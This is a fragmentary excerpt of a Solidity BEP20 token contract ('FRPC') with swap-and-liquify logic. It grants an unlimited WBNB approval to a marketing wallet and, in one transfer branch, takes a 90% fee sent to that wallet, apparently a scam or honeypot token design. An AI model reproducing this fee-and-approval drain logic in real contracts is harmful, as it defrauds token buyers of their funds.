...
contract BEP20TEST is IBEP20, Auth {
  ...
  string constant _name = "Fuck Router Poocoin";
  string constant _symbol = "FRPC";
  ...
  constructor() Auth(msg.sender) {
    ...
    IBEP20(WBNB).approve(address(marketingwallet),type(uint256).max);
  ...
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    ...
    inSwap = true;
    swapBNB();
    uint256 tempdenominator = marketingfee.add(liquidityfee);
    uint256 marketingtransfer = address(this).balance.mul(marketingfee).div(tempdenominator);
    payable(marketingwallet).transfer(marketingtransfer);
    uint256 beforetokenbalance = _balances[address(this)];
    buyBanana();
    autoaddLP(_balances[address(this)].sub(beforetokenbalance));
    inSwap = false;
    }
  ...
  function buyBanana() internal {
    address[] memory path = new address[](2);
    path[0] = WBNB;
    path[1] = address(this);
    router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance.div(2) }(
    0,
    path,
    address(this),
    block.timestamp
  ...
  function autoaddLP(uint256 amount) internal {
    router.addLiquidityETH{value: address(this).balance }(
    address(this),
    amount,
    0,
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    tempburnfee = 0;
    tempmarketingfee = amount.mul(900).div(1000);
    templiquidityfee = 0;
